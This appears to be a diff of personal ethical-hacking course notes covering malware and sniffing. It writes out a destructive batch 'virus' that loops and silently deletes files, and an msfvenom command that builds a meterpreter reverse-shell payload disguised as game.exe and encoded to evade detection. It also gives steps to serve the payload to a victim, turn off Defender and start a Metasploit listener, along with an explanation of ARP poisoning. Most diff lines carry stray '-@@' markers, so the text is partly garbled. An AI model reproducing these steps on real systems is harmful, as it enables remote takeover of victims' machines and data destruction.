@@ -552,43 +552,43 @@ How to infect systems using trojan -> Screenshot(40,41,43) -@@
    
 Different Ways Malware is spreaded -> Screenshot(32,33,34) -@@
 
-Create a Virus -> Screenshot(45), We will create it using simple dos cmds 
-@echo off	// This means that when this file get executed do not show the user it is executed
+Create a Virus -> Screenshot(45) -@@, We will create it using simple dos cmds -@@
+@echo off	// This means that when this file get executed do not show the user it is executed -@@
 :Testvirus	// naming the program
 start		// this will open another cmd line
 start www.msn.com	// it will open the website
 del C:\Test\*.* /q  // here we r deleting folder Test and all the types of files inside it, q is saying to work quitely
 goto :Testvirus		// this will make the file work again, so it work frequently and consume ur all resources untill it crash
 
-// save the file as file_name.bat
+// save the file as file_name.bat -@@
 
 Creating a Virus using a Tool -> Screenshot(46)
 - We can use tool such as "TeraBit Virus Maker", use the link given by the tutor only for this tool to download
 - U can create complex virus using advance tools or u can use dos cmds to create simple virus
 
 Creating a Trojan 1
-- Most of the outbound traffic which is going from ur computer to internet is not restricted.
+- Most of the outbound traffic which is going from ur computer to internet is not restricted.-@@
 - Reverse Connection -> If an attacker send a Trojan to the victim, and if victim click on the trojan he will be got
- connected to the attacker and as the outbound traffic is not restricted, So this way we can use this to bypass the firewall
-- kali cmd -> msfvenom	--help // this is used to create a payload
+ connected to the attacker and as the outbound traffic is not restricted, So this way we can use this to bypass the firewall -@@
+- kali cmd -> msfvenom	--help // this is used to create a payload -@@
 - kali cmd -> msfvenum -p windows/meterpreter/reverse_tcp LHOST=ip_of_attacker_system LPORT=4455 --format=exe > game.exe
-// payload which could not be detected by firewall is we r putting here our IP bcz once the payload 
+// this payload which could not be detected by firewall as it encode it, we r putting here our IP bcz once the payload 
 // is clicked we want a connection to our system, now the payload trojan game.exe is created and u just need to send it to
-// the victim
+// the victim -@@
 // u can send this file through social engineering or other way a simple basic way would be to copy the file in the attacker
-// location
+// location -@@
 // path -> var/wwww/html
-cmd kali -> service apache2 start // this service make the kali machine work as web server
+cmd kali -> service apache2 start // this service make the kali machine work as web server -@@
 browser victim -> http://ip_of_Attacker/trojan_payloadname	// for this step u need to disable defender, for this task find
 the windows defender then settings then clickon checkbox as "Turn on real-time protection", if the PC status becomes red then
 that means the defender is disabled, u also need to turn off the security in browser so go to browser security and make sure
-to uncheck the checkbox as "Enable Protected Mode"
+to uncheck the checkbox as "Enable Protected Mode" -@@
 // now the file would be able to download after all protection is disabled, this is just only for proof of concept to see the
-trojan in action.
+trojan in action. -@@
 // u need to make the kali listening so that the attacker machine could listen from the victim via trojan     
-- we need to start a database server that include all the exploits that will be used for this we use 
+- we need to start a database server that include all the exploits that will be used for this we use -@@ 
 cmd kali -> service postgresql start // this is how we r starting a service in kali linux, if on the execution of this cmd it
-didn't give any error then that means it is started
+didn't give any error then that means it is started -@@
 cmd kali -> msfconsole // this is to start a listener
 	> use exploit/multi/handler
 	> show options
@@ -613,11 +613,11 @@ Sniffering ->
 ARP request and ARP reply -> Screenshot(47)
 - During the ARP request the machine or router who gets it will spoof the MAC address of the machine for which the ARP
  request was done, So now the switch gets the spoofed MAC address and Switch doesn't have any other way to validate that and
- this is called ARP spoofing.
+ this is called ARP spoofing. -@@
 
 ARP poisioning is done by sending the ARP reply to every machine without ARP request and this will make the all MAC address
 table updated and this way the attacker machine will be able to pretend as the Router and all the traffic will be diverted to
-this attacker machine.
+this attacker machine. -@@
 
 To verify the ARP spoofing and Poinsioning -> cmd -> arp -a // this will tell u the table for the earlier ARP request and
 reply and from here u can see the router MAC address
